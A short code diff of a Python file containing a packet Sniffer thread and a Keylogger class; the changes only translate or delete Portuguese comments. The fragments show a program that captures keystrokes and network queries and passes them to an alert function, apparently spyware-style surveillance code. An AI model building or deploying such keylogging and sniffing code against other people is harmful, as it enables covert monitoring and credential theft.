@@ -169,8 +169,8 @@ class Sniffer(threading.Thread):
         self.logs = []
         self.queries = set()
         self.packet_count = 0
-        self.max_packet_count = 1000  # Número máximo de pacotes a capturar
-        self.capture_interval = 0.01  # Intervalo de captura em segundos
+        self.max_packet_count = 1000  # Max number of packages
+        self.capture_interval = 0.01
         self.capture_active = True
         self.lock = threading.Lock()
 
@@ -189,7 +189,7 @@ class Sniffer(threading.Thread):
                     with self.lock:
                         self.logs.append(log)
                         if len(self.logs) > 100:
-                            self.logs = self.logs[-100:]  # Mantém apenas os últimos 100 logs
+                            self.logs = self.logs[-100:] 
                         send_alert(log)
                         self.queries.add(query)
 
@@ -219,7 +219,6 @@ class Keylogger:
         elif event.name == "caps lock":
             pass  # ignore caps lock key
         else:
-            # Get the character that corresponds to the key
             if event.name.startswith("shift"):
                 shift_chars = self.get_shift_chars()
                 char = shift_chars.get(event.name, "")
